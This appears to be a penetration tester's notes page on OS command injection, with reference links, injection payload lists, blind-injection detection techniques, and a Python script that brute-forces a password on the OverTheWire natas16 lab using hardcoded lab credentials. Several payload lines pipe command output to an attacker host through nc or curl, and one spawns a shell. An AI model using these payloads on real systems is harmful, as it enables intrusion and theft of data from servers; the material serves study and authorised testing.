# Command Injection

| [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/12-Testing\_for\_Command\_Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection) |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions](https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions)                                                                                                                                                             |
| [https://blog.0xffff.info/2021/07/28/os-command-injection-tutorial-part-1-basics-and-filter-evasion/](https://blog.0xffff.info/2021/07/28/os-command-injection-tutorial-part-1-basics-and-filter-evasion/)                                                                                                                                 |
| [https://www.hackerone.com/ethical-hacker/how-command-injections](https://www.hackerone.com/ethical-hacker/how-command-injections)                                                                                                                                                                                                         |
| [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)                                                                                                                                                                 |
| [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/command\_injection.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt)                                                                                                                                                       |
| [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)                                                                                                                                                                                                                     |
| [https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)                                                                                                                                                                                                               |
| [https://en.wikipedia.org/wiki/Input\_Field\_Separators](https://en.wikipedia.org/wiki/Input_Field_Separators)                                                                                                                                                                                                                             |

It allows an attacker to execute operating system (OS) commands on the server that is running an application.

{% hint style="info" %}
On every request, always try to fuzz every parameter such as name, email, etc. putting `; & |` at the end and checking response.

If the command is limited (only git for example), research on **GTFOBins/LOLBas** ways to leverage.
{% endhint %}

## Basic payloads

{% code overflow="wrap" fullWidth="true" %}
```bash
######################### Useful commands
Purpose of command 	    Linux 	      Windows
Name of current user 	whoami 	      whoami
Operating system 	    uname -a 	  ver
Network configuration 	ifconfig 	  ipconfig /all
Network connections 	netstat -an   netstat -an
Running processes 	    ps -ef 	      tasklist 

######################### Injecting OS commands
https://insecure-website.com/stockStsatus?productID=381&storeID=29
# Function could be called out to a shell command
stockreport.pl 381 29
# If app has no defenses, we could submit the following input to execute an arbitrary command:
& echo aiwefwlguh &
#  If this input is submitted in the productID parameter, the command executed by the application is: 
stockreport.pl & echo aiwefwlguh & 29
# echo is useful for some types of command injection since it shows the output
# Placing & after the injected command is useful because it separates the injected command from whatever follows.

# To verify it works
id | nc $IP PORT
curl $IP:$PORT/whatever   and listen with nc -lvnp $PORT
;ping -c 2 $ATTACKER_IP
&&ipconfig
# Windows 
# How to detect environment (CMD or PS)
https://stackoverflow.com/users/4003407/user4003407
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
# Try first a possible innocent/whitelisted command
ipconfig;whoami
uptime;whoami
date;whoami
; sleep 5;
; ping -c/-n 2 $IP;
hexadecimal (\x2f\x65...)

# TEST FIRST IF WE CAN PING, FOR EXAMPLE:
; ping -c 2 $MYIP

From Kali --> tcpdump -i eth0/tun0 -n -v
# -n --> don't convert addresses to names
# -i ---> interface (usually eth0 or tun0 with VPN)

.*
$(command)
`command`
$IFS # field separator
export TEST=-  /// echo $TEST #--> it prints a dash to elude blacklists
```
{% endcode %}

{% hint style="info" %}
Try **sleep** 2 also as an alternative to ping to verify command injection
{% endhint %}

## Python Command Injection

```python
__import__('os').system('/bin/sh')
```

## Blind Command Injection

{% tabs %}
{% tab title="Overview" %}
Blind command injection occurs when the system call that's being made does not return the response of the call to the Document Object Model (or DOM).

```
ping
sleep/timeout
curl
Try redirects whoami>/var/www/html/test.txt
Check world-writable folders or any way to display those files
```

![](<../../.gitbook/assets/image (132).png>)

You can see in the above code that the response is never returned anywhere on the page. The only thing that gets returned is an alert that says whether a user was found on the system or not, but sometimes it won't be that easy. So here are a few ways to tell whether you have blind command injection or not.
{% endtab %}

{% tab title="Time delays" %}
Another way is `;sleep 5 (;sleep+5 w/ URL encode)` on every parameter

You can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond. The `ping` command is an effective way to do this, as it lets you specify the number of ICMP packets to send, and therefore the time taken for the command to run:

Try ping commands from here [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/command\_injection.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt)

Check different types of bypass on [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-a-line-return)
{% endtab %}

{% tab title="Script" %}
When we do not have a visible answer from the server, we can try to use the command (sleep 10) to check if the response is delayed 10 seconds. If so, we can continue injecting commands.

In the case of brute-forcing a password, we can use this approach with grep:

{% code overflow="wrap" %}
```bash
grep -E $REGULAR_EXPRESSION $FILE # regex like '^a*' (starting with a and sth else)
```
{% endcode %}

{% code overflow="wrap" %}
```python
#/usr/bin/python3

# BLIND COMMAND INJECTION

import requests, sys
from string import ascii_lowercase, ascii_uppercase, digits

url = 'http://natas16.natas.labs.overthewire.org/'

# GENERATE CHARSET
charset = ascii_lowercase + ascii_uppercase + digits

# AUTHENTICATION
s = requests.Session()
s.auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

password = ''

while len(password) < 32:
        for char in charset:
                payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
                r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)

                if len(r.text) == 1105:
                        password += char
                        sys.stdout.write(char)
                        sys.stdout.flush()
                        break
#               print(len(r.content)) # at first to check the size of the response, if it's smaller means the char was correct 

```
{% endcode %}
{% endtab %}

{% tab title="Ping!" %}
If you send a ping with 10 ICMP packets, the page should be loading for about 10 seconds.  If you send 20(!) packets, it should take about 20 seconds, and so on.
{% endtab %}

{% tab title="Output Redirection" %}
Redirect the output of a command to a file, then, using the browser, navigate to the page where the file is stored.  We all know the > Bash operator redirects output to a file or process so you could try redirecting the output of `id`, `whoami`, `netstat`, `ip addr` or other useful command to see if you can see the results.
{% endtab %}

{% tab title="Netcat Bypass" %}
`root; ls -la | nc {VPN_IP} {PORT}` . This will send the output of `ls -la` to your netcat listener.
{% endtab %}
{% endtabs %}

## Active Command Injection

![](<../../.gitbook/assets/image (71).png>)

&#x20;The program goes into a try block to execute the function `passthru($command_string)`.  You can read the docs on `passthru()` on [PHP's website](https://www.php.net/manual/en/function.passthru.php), but in general, it is executing what gets entered into the input then passing the output directly back to the browser.

```
whoami
id
ifconfig
ip addr
uname -a
ps -ef

whoami
ver
ipconfig
tasklist
netstat -an
```
